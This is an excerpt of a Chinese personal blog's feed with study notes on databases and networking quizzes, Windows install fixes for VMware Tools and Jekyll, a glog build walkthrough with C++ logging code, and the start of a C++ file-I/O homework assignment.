        <content type="html"><![CDATA[<p><strong>在数据库的三级模式结构中，描述数据库中全体数据的全局逻辑结构和特征的是（）</strong><br>答案：.概念模式<br>数据库系统的三级模式结构是指数据库系统是由模式、外模式和内模式三级构成的。 （1）模式 模式也称逻辑模式或概念模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图。 模式实际上是数据库数据在逻辑级上的视图。一个数据库只有一个模式。定义模式时不仅要定义数据的逻辑结构，而且要定义数据之间的联系，定义与数据有关的安全性、完整性要求。 （2）外模式 外模式也称用户模式，它是数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示。 外模式通常是模式的子集。一个数据库可以有多个外模式。应用程序都是和外模式打交道的。外模式是保证数据库安全性的一个有力措施。每个用户只能看见和访问所对应的外模式中的数据，数据库中的其余数据对他们是不可见的。 （3）内模式 内模式也称存储模式，一个数据库只有一个内模式。它是数据物理结构和存储方式的描述，是数据在数据库内部的表示方式。例如，记录的存储方式是顺序结构存储还是B树结构存储；索引按什么方式组织；数据是否压缩，是否加密；数据的存储记录结构有何规定等。</p><p><strong>SQL 语言具有（ ）的功能。</strong><br>答案 ：数据定义、数据操纵、数据控制<br>数据定义：CREATE、DROP、ALTER<br>数据操作：SELECT、DELETE、UPDATE、INSERT<br>数据控制：GRANT、DENY、REVOKE</p><p><strong>在数据库设计中，对数据库存储结构和存取方法的分析在（        ）设计阶段。</strong><br>答案：物理设计<br>需求分析阶段的任务是：对现实世界要处理的对象（组织、部门、企业等）进行详细调查，在了解现行系统的概况，确定新系统功能的过程中，确定系统边界、收集支持系统目标的基础数据及其处理方法。概念设计阶段的任务是：对用户要求描述的现实世界，通过对其进行分类、聚集和概括，建立抽象的概念数据模型，如果是关系数据库，其得到的结果是ER模型。逻辑设计阶段的任务是：将概念数据模型设计成数据库的一种逻辑模式（关系模式），然后对关系模式进一步做规范化处理，从而提高存储效率和处理效率。物理结构设计的任务是：根据特定数据库管理系统所提供的多种存储结构和存取方法，为具体的应用任务选定最合适的物理存储结构、存取方法和存取路径等。这一步设计的结果就是物理数据库</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware 安装Tools 遇到的问题：VGAuthService 启动失败</title>
      <link href="/posts/36381/"/>
      <url>/posts/36381/</url>
      
        <content type="html"><![CDATA[<blockquote><p>虚拟机里遇到这个问题特此记录一下<br>虚拟机内部环境： Windows 7</p></blockquote><p>问题描述：VGAuthservice 启动失败，请确保您有足够的权限启动系统服务<br>Installing VMware tools fails with error:VGAuthService &amp; Common Agent failed<br>解决方案 ：安装补丁 KB2999226就可以了<br>其他系统建议安装VC运行库看看。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用cmake-gui进行转换为Visual Studio  的sln工程文件&amp;&amp;glog在Windows下的使用</title>
      <link href="/posts/49708/"/>
      <url>/posts/49708/</url>
      
        <content type="html"><![CDATA[<p>1.首先将库git到本地<br><a href="https://github.com/google/glog">https://github.com/google/glog</a><br>2.使用cmake-gui进行转换为Visual Studio 的sln工程文件(如下图）<br>（使用我转换好的也可以<a href="https://github.com/czqu/builds/tree/master/glogs">https://github.com/czqu/builds/tree/master/glogs</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49708/20200513181042328.png" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49708/20200513181828378.png" alt="在这里插入图片描述"><br><strong>然后选择vs版本和CPU架构</strong>（如果之前编译错了，再进去可能不能进到这个界面，把输出目录删除即可）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49708/20200513181222563.png" alt="在这里插入图片描述"><br>3.点击generate，即可完成。</p><p>4.如果出现如下错误，说明你缺少gflags库，编译方法和上面一样不再赘述<br><a href="https://github.com/gflags/gflags">https://github.com/gflags/gflags</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Could not find a package configuration file provided by <span class="string">"gflags"</span> (requested</span><br><span class="line">  version 2.2.0) with any of the following names:</span><br><span class="line"></span><br><span class="line">    gflagsConfig.cmake</span><br><span class="line">    gflags-config.cmake</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49708/20200513181714187.png" alt="在这里插入图片描述"><br>5.然后新建一个测试工程（debug库和release库不能混用，不同架构也不能），添加头文件和库目录，记得需要在开头加上 GLOG_NO_ABBREVIATED_SEVERITIES和GOOGLE_GLOG_DLL_DECL，不然会报错</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOG_NO_ABBREVIATED_SEVERITIES</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GOOGLE_GLOG_DLL_DECL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;logging.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> google;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">"glogd.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">"glog.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testGlog2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="type">char</span> str[<span class="number">20</span>] = <span class="string">"hello log!"</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">while</span> (i &gt; <span class="number">0</span>) {</span><br><span class="line">    <span class="comment">//  LOG(INFO) &lt;&lt; str;</span></span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">"2info 2test"</span> &lt;&lt; <span class="string">"2hello 2log!"</span>;  <span class="comment">//输出一个Info日志</span></span><br><span class="line">    <span class="comment">//  LOG(WARNING) &lt;&lt; "warning test";  //输出一个Warning日志</span></span><br><span class="line">  <span class="comment">//    LOG(ERROR) &lt;&lt; "error test";  //输出一个Error日志</span></span><br><span class="line">    i--;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testGlog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">// Start google log system:</span></span><br><span class="line">FLAGS_log_dir = <span class="string">"E:\\logs"</span>;</span><br><span class="line">google::<span class="built_in">InitGoogleLogging</span>(<span class="string">"loglog"</span>);</span><br><span class="line">google::<span class="built_in">SetLogDestination</span>(google::GLOG_INFO, <span class="string">"E:\\logs\\INFO_"</span>);</span><br><span class="line">google::<span class="built_in">SetStderrLogging</span>(google::GLOG_FATAL);</span><br><span class="line">google::<span class="built_in">SetLogFilenameExtension</span>(<span class="string">"log_"</span>);</span><br><span class="line">FLAGS_colorlogtostderr = <span class="literal">true</span>;  <span class="comment">// Set log color</span></span><br><span class="line">FLAGS_logbufsecs = <span class="number">0</span>;  <span class="comment">// Set log output speed(s)</span></span><br><span class="line">FLAGS_max_log_size = <span class="number">1024</span>;  <span class="comment">// Set max log file size</span></span><br><span class="line">FLAGS_stop_logging_if_full_disk = <span class="literal">true</span>;  <span class="comment">// If disk is full</span></span><br><span class="line">thread *t = <span class="keyword">new</span> <span class="built_in">thread</span>(testGlog2);</span><br><span class="line"><span class="type">char</span> str[<span class="number">20</span>] = <span class="string">"hello log!"</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">while</span> (i &gt; <span class="number">0</span>) {</span><br><span class="line"><span class="comment">//  LOG(INFO) &lt;&lt; str;</span></span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">"info test"</span> &lt;&lt; <span class="string">"hello log!"</span>;  <span class="comment">//输出一个Info日志</span></span><br><span class="line"><span class="comment">//  LOG(WARNING) &lt;&lt; "warning test";  //输出一个Warning日志</span></span><br><span class="line"><span class="comment">//  LOG(ERROR) &lt;&lt; "error test";  //输出一个Error日志</span></span><br><span class="line">    i--;</span><br><span class="line">}</span><br><span class="line">t-&gt;<span class="built_in">join</span>();</span><br><span class="line">google::<span class="built_in">ShutdownGoogleLogging</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 编译 </tag>
            
            <tag> Windows </tag>
            
            <tag> Cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络题目集锦</title>
      <link href="/posts/1279/"/>
      <url>/posts/1279/</url>
      
        <content type="html"><![CDATA[<p><strong>音频的时延抖动可通过在发送方为每个块规定一个序号或时间戳，在接收方延迟播放音频块来消除。</strong><br>答案：正确</p><p>什么是抖动？</p><p>在网络上连续传输的数据包即便使用相同的路径，也会有不同的延时。这是由于分组交换网络固有的两个关键原因造成的。第一，数据包被单独路由。第二，网络设备接收队列中的数据包，因此无法保证延时调度不变。</p><p>每个数据包之间的这种延时不一致称为抖动。</p><p>为了弥补抖动，在连接的接收端使用抖动缓冲区。抖动缓冲区收集并存储传入数据包，以便它可以确定如何以一致的间隔发送它们。</p><ol><li><p>静态抖动缓冲—其在系统的硬件中实现，并且通常由制造商配置。</p></li><li><p>动态抖动缓冲—其在系统软件中实现，并由管理员进行配置。他们可对缓冲进行调整以适应网络变化。</p></li></ol><p>播放延时</p><p>播放延时是数据包到达时和播放时间之间的延时。当抖动缓冲区存储传入数据包并等待以均匀间隔分配它们时，这会增加数据包到达时间与播放时间之间的时间，也被称为播放延时。这个延时是由抖动缓冲区引入的，因为它负责规定传入数据包何时分发。</p><p><strong>目前,最流行的以太网组网的拓扑结构是 （星型结构 ）。</strong></p><p><strong>HDLC中，数据比特串0111101111110装帧发送出去的串为（01111011111010 ）。</strong><br>HDLC协议每次发送方要发送的信息中含有5个以上连续的1时，它总要在第五个1后面插入一个冗余的0，不管第6个位是0还是1，这个额外的0都要插入。</p><p><strong>能提供E1接口的路由器是CISCO 4500</strong></p><p><strong>Linux中，一个端口能够接受tcp链接数量的理论上限是？</strong><br>答案：无上限</p><p><strong>采用FDM技术进行多路复用时，复用后的信号的带宽通常( 大于复用前所有信号的带宽之和   )。</strong></p><p>对于频分复用技术而言，信号一般得调制为模拟信号，因为只有模拟才有频率可言。。<br>信号的频率是有范围的，频分多路复用是将多路基带信号调制到不同频率载波上再进行叠加形成一个复合信号。在物理信道的可用带宽超过单个原始信号所需带宽的情况下，可将该物理信道的总带宽分割成若干个与传输单个信号带宽相同（或略宽）的子信道，每个子信道传输一种信号。<br>每个子信道分配的带宽总和  必须不超过  信道的总带宽，所以  复用后的信号的带宽 ≤ 信道总带宽。（本来就这么宽，多路复用也不能把物理带宽给撑大了，hhh）<br>但是题目说的是  复用前所有信号的带宽之和，因为分割的子信道一般略大于传输单个信号带宽，所以，选择大于。</p><p><strong>一主机的IP地址配置为176.12.128.250，子网掩码配置为255.255.255.248，则其默认网关可配置为 D_ 。</strong></p><p>A 176.12.128.1<br>B 176.12.128.248<br>C 192.168.1.1<br>D 176.12.128.254</p><p>根据主机ip：       172  .  12  .  128  . 1111 1010<br> 子网掩码：      255  . 255  .  255  . 1111 1000<br>求得子网号为：   172  .  12  .  128  . 1111 1000   (即172.12.128.248)<br>对于A，172.12.128.0000 0001不在同一个网段<br>对于B，网络中全0和全1留作他用<br>对于C，不在同一个网段<br>D选项 172.12.128.1111 1110 在同一个网段，答案选D</p><p><strong>下列选项中，对正确接收到的数据帧进行确认的MAC协议是（CSMA/CA）。</strong></p><p>CSMA/CA①用于无线网②ack重传确认③RTS， CTS隐蔽站④不需要发送检测冲突</p><p><strong>在掩码为 255.255.224.0 条件下，下面哪些 ip 地址属于同一网段（AC）</strong><br>A 192.168.235.25<br>B 192.168.188.99<br>C 192.168.246.187<br>D 192.168.67.28</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1279/20200328213407978.png" alt="在这里插入图片描述"></p><p><strong>以下有关Http协议的描述中，正确的有？</strong></p><p>A post请求一般用于修改服务器上的资源，对发送的消息数据量没有限制，通过表单方式提交<br>B HTTP返回码302表示永久重定向，需要重新URI<br>C 可以通过206返回码实现断点续传<br>D HTTP1.1实现了持久连接和管线化操作以及主动通知功能，相比http1.0有大福性能提升</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1279/20200328213736357.png" alt="在这里插入图片描述"></p><p>错误代码(也称作状态代码)，指为服务器所接收每个请求(网页点击)分配的 3 位数代码。多数有效网页点击都有状态代码 200(“正常”)。”网页未找到”错误会生产 404 错误。</p><p>1xx(临时响应)<br>用于表示临时响应并需要请求者执行操作才能继续的状态代码。<br>100(继续) 请求者应当继续提出请求。服务器返回此代码则意味着，服务器已收到了请求的第一部分，现正在等待接收其余部分。<br>101(切换协议) 请求者已要求服务器切换协议，服务器已确认并准备进行切换。</p><p>2xx(成功)<br>用于表示服务器已成功处理了请求的状态代码。<br>代码 说明<br>200(成功) 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。如果您的 robots.txt文件显示为此状态，那么，这表示 Googlebot 已成功检索到该文件。<br>201(已创建) 请求成功且服务器已创建了新的资源。<br>202(已接受) 服务器已接受了请求，但尚未对其进行处理。<br>203(非授权信息) 服务器已成功处理了请求，但返回了可能来自另一来源的信息。<br>204(无内容) 服务器成功处理了请求，但未返回任何内容。<br>205(重置内容) 服务器成功处理了请求，但未返回任何内容。与 204 响应不同，此响应要求请求者重置文档视图(例如清除表单内容以输入新内容)。<br>206(部分内容) 服务器成功处理了部分 GET 请求。</p><p>3xx(已重定向)<br>要完成请求，您需要进一步进行操作。通常，这些状态代码是永远重定向的。Google 建议您在每次请求时使用的重定向要少于 5 个。您可以使用网站管理员工具来查看 Googlebot 在抓取您已重定向的网页时是否会遇到问题。诊断下的抓取错误页中列出了 Googlebot 由于重定向错误而无法抓取的网址。<br>300(多种选择) 服务器根据请求可执行多种操作。服务器可根据请求者 (User agent) 来选择一项操作，或提供操作列表供请求者选择。<br>301(永久移动) 请求的网页已被永久移动到新位置。服务器返回此响应(作为对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。您应使用此代码通知 Googlebot 某个网页或网站已被永久移动到新位置。<br>302(临时移动) 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。此代码与响应 GET 和 HEAD 请求的 301 代码类似，会自动将请求者转到不同的位置。但由于 Googlebot 会继续抓取原有位置并将其编入索引，因此您不应使用此代码来通知 Googlebot 某个页面或网站已被移动。<br>303(查看其他位置) 当请求者应对不同的位置进行单独的 GET 请求以检索响应时，服务器会返回此代码。对于除 HEAD 请求之外的所有请求，服务器会自动转到其他位置。<br>304(未修改) 自从上次请求后，请求的网页未被修改过。服务器返回此响应时，不会返回网页内容。<br>如果网页自请求者上次请求后再也没有更改过，您应当将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。由于服务器可以告诉 Googlebot 自从上次抓取后网页没有更改过，因此可节省带宽和开销。<br>305(使用***) 请求者只能使用<em><strong>访问请求的网页。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的</strong></em>。<br>307(临时重定向) 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。此代码与响应 GET 和 HEAD 请求的 301 代码类似，会自动将请求者转到不同的位置。但由于 Googlebot 会继续抓取原有位置并将其编入索引，因此您不应使用此代码来通知 Googlebot 某个页面或网站已被移动。</p><p>4xx(请求错误)<br>这些状态代码表示，请求可能出错，已妨碍了服务器对请求的处理。<br>400(错误请求) 服务器不理解请求的语法。<br>401(未授权) 请求要求进行身份验证。登录后，服务器可能会返回对页面的此响应。<br>403(已禁止) 服务器拒绝请求。如果在 Googlebot 尝试抓取您网站上的有效网页时显示此状态代码(您可在 Google 网站管理员工具中诊断下的网络抓取页面上看到此状态代码)，那么，这可能是您的服务器或主机拒绝 Googlebot 对其进行访问。<br>404(未找到) 服务器找不到请求的网页。例如，如果请求是针对服务器上不存在的网页进行的，那么，服务器通常会返回此代码。<br>如果您的网站上没有 robots.txt 文件，而您在 Google 网站管理员工具”诊断”标签的 robots.txt 页上发现此状态，那么，这是正确的状态。然而，如果您有 robots.txt 文件而又发现了此状态，那么，这说明您的 robots.txt 文件可能是命名错误或位于错误的位置。(该文件应当位于顶级域名上，且应当名为 robots.txt)。<br>如果您在 Googlebot 尝试抓取的网址上发现此状态(位于”诊断”标签的 HTTP 错误页上)，那么，这表示 Googlebot 所追踪的可能是另一网页中的无效链接(旧链接或输入有误的链接)。<br>405(方法禁用) 禁用请求中所指定的方法。<br>406(不接受) 无法使用请求的内容特性来响应请求的网页。<br>407(需要<em><strong>授权) 此状态代码与 401(未授权)类似，但却指定了请求者应当使用</strong></em>进行授权。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的***。<br>408(请求超时) 服务器等候请求时超时。<br>409(冲突) 服务器在完成请求时发生冲突。服务器必须包含有关响应中所发生的冲突的信息。服务器在响应与前一个请求相冲突的 PUT 请求时可能会返回此代码，同时会提供两个请求的差异列表。<br>410(已删除) 如果请求的资源已被永久删除，那么，服务器会返回此响应。该代码与 404(未找到)代码类似，但在资源以前有但现在已经不复存在的情况下，有时会替代 404 代码出现。如果资源已被永久删除，那么，您应当使用 301 代码指定该资源的新位置。<br>411(需要有效长度) 服务器不会接受包含无效内容长度标头字段的请求。<br>412(未满足前提条件) 服务器未满足请求者在请求中设置的其中一个前提条件。<br>413(请求实体过大) 服务器无法处理请求，因为请求实体过大，已超出服务器的处理能力。<br>414(请求的 URI 过长) 请求的 URI(通常为网址)过长，服务器无法进行处理。<br>415(不支持的媒体类型) 请求的格式不受请求页面的支持。<br>416(请求范围不符合要求) 如果请求是针对网页的无效范围进行的，那么，服务器会返回此状态代码。<br>417(未满足期望值) 服务器未满足”期望”请求标头字段的要求。</p><p>5xx(服务器错误)<br>这些状态代码表示，服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。</p><p>500(服务器内部错误) 服务器遇到错误，无法完成请求。<br>501(尚未实施) 服务器不具备完成请求的功能。例如，当服务器无法识别请求方法时，服务器可能会返回此代码。<br>502(错误网关) 服务器作为网关或***，从上游服务器收到了无效的响应。<br>503(服务不可用) 目前无法使用服务器(由于超载或进行停机维护)。通常，这只是一种暂时的状态。<br>504(网关超时) 服务器作为网关或代理，未及时从上游服务器接收请求。<br>505(HTTP 版本不受支持) 服务器不支持请求中所使用的 HTTP 协议版本。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下用gem install jekyll命令安装jekyll错误</title>
      <link href="/posts/1223/"/>
      <url>/posts/1223/</url>
      
        <content type="html"><![CDATA[<p>Windows下用gem install jekyll命令安装jekyll错误的解决方案</p><p>ERROR: Failed to build gem native extension</p><h2 id="错误如下："><a href="#错误如下：" class="headerlink" title="错误如下："></a>错误如下：</h2><p>ruby版本也正常，安装的也是with devkit的版本</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Temporarily enhancing PATH <span class="keyword">for</span> MSYS/MINGW... </span><br><span class="line">Building native extensions. This could take a <span class="keyword">while</span>...    </span><br><span class="line">ERROR:  Error installing jekyll:                    </span><br><span class="line">ERROR: Failed to build gem native extension.                                           </span><br><span class="line">current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser                                                                     </span><br><span class="line">C:/Ruby26-x64/bin/ruby.exe -I C:/Ruby26-x64/lib/ruby/2.6.0 -r ./siteconf20200725-11868-qpbmqf.rb extconf.rb  </span><br><span class="line">creating Makefile                                                                                                                                                        </span><br><span class="line">current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser                                                                         </span><br><span class="line">make <span class="string">"DESTDIR="</span> clean                                                                                                                                                       </span><br><span class="line">current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser                                                                         </span><br><span class="line">make <span class="string">"DESTDIR="</span>                                                                                                                                                             </span><br><span class="line">make failedNo such file or directory - make <span class="string">"DESTDIR="</span>                                                                                                                                                                                                                                                                                                  </span><br><span class="line">Gem files will remain installed <span class="keyword">in</span> C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0 <span class="keyword">for</span> inspection.                                                              </span><br><span class="line">Results logged to C:/Ruby26-x64/lib/ruby/gems/2.6.0/extensions/x64-</span><br><span class="line">mingw32/2.6.0/http_parser.rb-0.6.0/gem_make.out </span><br></pre></td></tr></tbody></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>输入ridk install，安装MSYS2 and MINGW development toolchain<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1223/20200725105324259.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++作业</title>
      <link href="/posts/43139/"/>
      <url>/posts/43139/</url>
      
        <content type="html"><![CDATA[<h1 id="输入输出流与文件操作"><a href="#输入输出流与文件操作" class="headerlink" title="输入输出流与文件操作"></a>输入输出流与文件操作</h1><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//职工</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span></span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> m_Id;</span><br><span class="line">&nbsp; &nbsp; string m_Name;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> m_Age;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> m_Wage;</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Person</span>(<span class="type">int</span> i, string n, <span class="type">int</span> a, <span class="type">int</span> w): <span class="built_in">m_Id</span>(i), <span class="built_in">m_Name</span>(n), <span class="built_in">m_Age</span>(a), <span class="built_in">m_Wage</span>(w) { }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">PrintInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"==================="</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"号码:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Id &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"名字:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Name &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"年龄:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Age &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"工资:\t"</span> &lt;&lt; <span class="keyword">this</span> -&gt; m_Wage &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; <span class="string">"==================="</span> &lt;&lt; endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">Person *p[<span class="number">3</span>] =</span><br><span class="line">{</span><br><span class="line">&nbsp; 